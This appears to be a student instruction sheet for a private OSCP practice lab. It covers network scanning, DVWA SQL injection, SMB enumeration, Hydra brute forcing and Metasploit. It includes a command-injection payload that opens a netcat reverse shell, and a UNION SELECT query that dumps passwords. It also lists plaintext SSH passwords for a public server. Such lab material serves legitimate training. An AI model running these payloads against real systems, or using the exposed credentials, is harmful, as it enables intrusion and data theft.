# 📚 OSCP Lab - Student Instructions

## 🔐 Your Login Credentials

### Student 1
```
SSH Command: ssh oscpuser1@155.138.197.128
Username: oscpuser1
Password: OscpLab1!2024
Your Kali IP: 172.16.0.11
```

### Student 2
```
SSH Command: ssh oscpuser2@155.138.197.128
Username: oscpuser2
Password: OscpLab2!2024
Your Kali IP: 172.16.0.12
```

### Student 3
```
SSH Command: ssh oscpuser3@155.138.197.128
Username: oscpuser3
Password: OscpLab3!2024
Your Kali IP: 172.16.0.13
```

### Student 4
```
SSH Command: ssh oscpuser4@155.138.197.128
Username: oscpuser4
Password: OscpLab4!2024
Your Kali IP: 172.16.0.14
```

## 🖥️ Server Information
- **Server IP:** 155.138.197.128
- **Platform:** Vultr Cloud
- **Location:** Your configured region
- **Network:** 172.16.0.0/24 (shared lab network)

---

## Getting Started (All Students)

### Step 1: Connect to the Server
```bash
# Use YOUR assigned credentials above
ssh oscpuser[YOUR_NUMBER]@155.138.197.128
# Enter your password when prompted
```

### Step 2: Start Your Lab Environment
```bash
# Once logged in, run:
./start-lab.sh

# You'll see:
# "OSCP Lab - User [YOUR_NUMBER]"
# "Your Kali IP: 172.16.0.1[YOUR_NUMBER]"
# You're now in your Kali container!
```

### Step 3: Install Required Tools (First Time Only)
```bash
# Update and install tools
apt update
apt install -y nmap netcat-traditional curl gobuster hydra smbclient enum4linux metasploit-framework
```

---

## 🎯 LAB EXERCISES

## LAB 1: Network Discovery

### Objective: Find all live hosts and identify services

```bash
# 1. Check your network interface
ifconfig
# Note your IP: 172.16.0.1X (where X is your user number)

# 2. Discover live hosts
nmap -sn 172.16.0.0/24

# 3. Scan specific target for open ports
nmap -sV -sC 172.16.0.20

# 4. Comprehensive scan of all ports
nmap -p- 172.16.0.20
```

**Expected Results:**
- Find 6-7 live hosts
- Identify SSH on port 22
- Note other open services

---

## LAB 2: Web Application Testing

### Objective: Enumerate and test the vulnerable web application

```bash
# 1. Check if web server is running
curl http://172.16.0.40

# 2. Browse to the application
curl -I http://172.16.0.40

# 3. Enumerate directories
gobuster dir -u http://172.16.0.40 -w /usr/share/wordlists/dirb/common.txt

# 4. Test for SQL injection (manual)
curl "http://172.16.0.40/vulnerabilities/sqli/?id=1' OR '1'='1&Submit=Submit"

# 5. Try default credentials
# Username: admin
# Password: password
curl -X POST http://172.16.0.40/login.php -d "username=admin&password=password&Login=Login"
```

**Expected Results:**
- Find DVWA (Damn Vulnerable Web Application)
- Discover /login.php, /setup.php, /vulnerabilities/
- Confirm SQL injection vulnerability

---

## LAB 3: SMB Enumeration

### Objective: Enumerate SMB shares and access files

```bash
# 1. Scan for SMB ports
nmap -p 139,445 172.16.0.60

# 2. List available shares
smbclient -L //172.16.0.60 -N

# 3. Connect to public share
smbclient //172.16.0.60/public -N

# 4. Inside SMB shell, explore:
smb: \> ls
smb: \> get test.txt
smb: \> exit

# 5. Use enum4linux for detailed enumeration
enum4linux -a 172.16.0.60
```

**Expected Results:**
- Find 'public' share with anonymous access
- Download test.txt file
- Enumerate users and groups

---

## LAB 4: Password Attacks

### Objective: Perform brute force attacks to find credentials

```bash
# 1. Create a password list
cat > passwords.txt << EOF
password
admin
123456
password123
admin123
root
toor
letmein
EOF

# 2. Create a username list
cat > users.txt << EOF
root
admin
user
test
EOF

# 3. Brute force SSH
hydra -l root -P passwords.txt ssh://172.16.0.20

# 4. Brute force web login
hydra -l admin -P passwords.txt http-post-form://172.16.0.40/login.php:username=^USER^&password=^PASS^&Login=Login:incorrect

# 5. Try found credentials
ssh root@172.16.0.20
# Password: toor (if found)
```

**Expected Results:**
- Find credential: root:toor for SSH
- Find credential: admin:password for web

---

## LAB 5: Exploitation Practice

### Objective: Use Metasploit to exploit vulnerabilities

```bash
# 1. Start Metasploit
msfconsole

# 2. Inside Metasploit:
msf6 > db_status
msf6 > search dvwa

# 3. Use the DVWA login scanner
msf6 > use auxiliary/scanner/http/dvwa_login
msf6 > set RHOSTS 172.16.0.40
msf6 > set USERNAME admin
msf6 > set PASSWORD password
msf6 > run

# 4. Manual SQL injection exploitation
msf6 > exit

# Back in terminal, extract data via SQLi
curl "http://172.16.0.40/vulnerabilities/sqli/?id=1' UNION SELECT user,password FROM users--&Submit=Submit"

# 5. Create a reverse shell (optional advanced)
# On Kali (your machine):
nc -lvnp 4444

# Inject command via vulnerable parameter
curl "http://172.16.0.40/vulnerabilities/exec/?ip=127.0.0.1;nc 172.16.0.1X 4444 -e /bin/bash&Submit=Submit"
```

**Expected Results:**
- Successfully use Metasploit modules
- Extract user data via SQL injection
- Establish reverse shell (advanced)

---

## 📝 Lab Completion Checklist

### After completing all labs, you should have:

- [ ] Identified all live hosts on the network
- [ ] Found open ports and services on each target
- [ ] Enumerated the web application structure
- [ ] Confirmed SQL injection vulnerability
- [ ] Listed and accessed SMB shares
- [ ] Successfully brute-forced SSH credentials
- [ ] Used Metasploit to scan/exploit
- [ ] Extracted sensitive data from the database
- [ ] (Optional) Achieved command execution

---

## 💡 Tips for Success

1. **Take Notes**: Document every finding
   ```bash
   # Create a notes file
   nano ~/notes.txt
   ```

2. **Save Your Work**: Your work persists in your home directory
   ```bash
   # Save scan results
   nmap -sV 172.16.0.20 > ~/nmap_scan.txt
   ```

3. **Work Methodically**: Follow the OSCP methodology
   - Enumerate thoroughly before exploiting
   - Try default credentials first
   - Document your process

4. **Collaborate**: Each user has their own environment, but targets are shared
   - User 1: Kali at 172.16.0.11
   - User 2: Kali at 172.16.0.12
   - User 3: Kali at 172.16.0.13
   - User 4: Kali at 172.16.0.14

---

## 🚪 Exiting

When you're done practicing:

```bash
# Exit Kali container
exit

# Exit SSH session
exit
```

---

## ⚠️ Important Notes

- **Session Time**: No time limit, but server costs $0.43/day
- **Your Work**: Saved in your home directory
- **Shared Targets**: All users attack the same targets (be courteous)
- **Resources**: Each user has their own Kali instance

---

## 🆘 Troubleshooting

### Can't connect to targets?
```bash
# Check network
ping 172.16.0.20
# If fails, contact admin
```

### Tools not installed?
```bash
# Install missing tools
apt update && apt install -y [tool-name]
```

### Lost or stuck?
```bash
# Return to home
cd ~
# Restart your lab
exit
./start-lab.sh
```

---

## 📊 Target Reference

| Target | IP | Services | Purpose |
|--------|-----|----------|---------|
| Linux Server | 172.16.0.20 | SSH (22) | Password attacks, privilege escalation |
| Web Server | 172.16.0.40 | HTTP (80) | Web app testing, SQL injection |
| SMB Server | 172.16.0.60 | SMB (139,445) | Share enumeration, file access |

---

## Good luck with your OSCP preparation! 🎯